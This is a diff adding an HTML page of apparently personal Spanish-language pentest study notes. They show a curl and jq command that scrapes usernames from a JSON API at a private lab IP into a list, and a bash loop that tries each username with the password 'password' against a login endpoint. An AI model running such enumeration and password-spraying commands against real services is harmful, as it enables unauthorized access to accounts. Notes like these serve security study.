@@ -1,0 +1,17 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Curl</title>
+</head><body><span style="font-size: 16pt"><span style="background-color: #00ffff">Cuando tenemos una pagina con un monton de json podemos bajar los nombres y quitarle los signos de json como en esta pagina.</span><br/>
+<img src="image.png"/><br/>
+<span style="background-color: #00ffff">Con este comando lo bajamos quitamos los caraecteres especiales creamos una lista par usarla para brute-force</span><br/>
+<br/>
+<b><span style="background-color: #ffff00">curl http://192.168.120.127/api/users | jq '.[]' -r &gt; users.txt<br/>
+<br/>
+<img src="image 2.png"/><br/>
+<br/>
+</span></b><span style="background-color: #00ffff">Tambien podemo usar un curl command para ver que combinacion de user y pass funcionan en una pagina</span><b><span style="background-color: #ffff00"><br/>
+</span></b><b><span style="background-color: #ffff00"><br/>
+</span></b><b><span style="background-color: #ffff00">for user in $(cat users.txt); do curl 'http://192.168.120.127/login' --data &quot;{\&quot;username\&quot;:\&quot;${user}\&quot;,\&quot;password\&quot;:\&quot;password\&quot;}&quot; -H &quot;Content-Type: application/json&quot; 2&gt;/dev/null | grep -v Unauthorized &amp;&amp; echo $user ; done</span></b><br/>
+<br/>
+</span></body></html>
